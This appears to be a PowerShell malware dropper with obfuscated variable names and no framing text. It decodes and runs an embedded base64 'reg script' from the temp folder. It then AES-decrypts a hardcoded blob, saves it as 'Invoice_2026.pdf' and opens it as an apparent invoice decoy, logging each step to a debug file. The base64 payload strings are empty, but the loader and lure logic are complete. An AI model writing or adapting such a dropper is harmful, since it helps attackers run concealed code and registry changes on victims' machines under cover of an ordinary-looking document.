$ErrorActionPreference='Continue'
try{
$qdnqea=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$qxlckq="$env:TEMP\cwencsqg.ps1"
[IO.File]::WriteAllText($qxlckq,$qdnqea,[Text.Encoding]::UTF8)
"[step1] reg script written to $qxlckq" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $qxlckq
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$edlvwr=[Convert]::FromBase64String('ifWS5ldE9X4adBAI662za09/lQ+BH9nJd1hxXasdQxo=')
$owrboi=[Convert]::FromBase64String('QQnoen5BT9GP70iSgkbh+w==')
$zsjwjv=[Convert]::FromBase64String('')
$fwmvzy=New-Object Security.Cryptography.AesManaged
$fwmvzy.Key=$edlvwr;$fwmvzy.IV=$owrboi;$fwmvzy.Mode='CBC';$fwmvzy.Padding='PKCS7'
$aagwre=$fwmvzy.CreateDecryptor()
$vssbfg=New-Object IO.MemoryStream(,$zsjwjv)
$ncatwf=New-Object Security.Cryptography.CryptoStream($vssbfg,$aagwre,[Security.Cryptography.CryptoStreamMode]::Read)
$xxnigh=New-Object IO.MemoryStream
$ncatwf.CopyTo($xxnigh);$fwmvzy.Dispose()
$gckamw="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($gckamw,$xxnigh.ToArray())
"[step2] PDF written to $gckamw" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process "$gckamw"
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
